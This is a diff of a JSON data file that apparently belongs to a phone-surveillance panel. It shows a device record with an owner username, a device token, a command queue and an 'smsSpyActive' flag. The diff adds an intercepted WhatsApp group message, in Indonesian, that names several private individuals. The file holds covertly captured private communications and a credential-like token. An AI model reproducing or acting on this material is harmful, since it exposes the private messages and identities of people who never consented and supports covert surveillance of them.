@@ -9361,7 +9361,7 @@
     "deviceName": "HP-RRR-85A1",
     "ownerUsername": "raditcees",
     "token": "d40c7b4bef4b07ee53e2456f723de6fe",
-    "lastSeen": 1777251703088,
+    "lastSeen": 1777251724207,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T07:30:11.065Z",
@@ -9377,6 +9377,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Senam Rappocini (7 pesan): ~ .",
+        "content": "Inshaa Allah ikut linedance besok Senin di rumahx Hj Rosmini\n1.Hj Rosmini\n2.fany\n3.Ika\n4.dg sakking\n5.\nDst ....\nHanya setiap Senin, Krn kamis saya di sanggar senam the Vavad jipang raya",
+        "time": "27/04 09:02",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777251726375
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
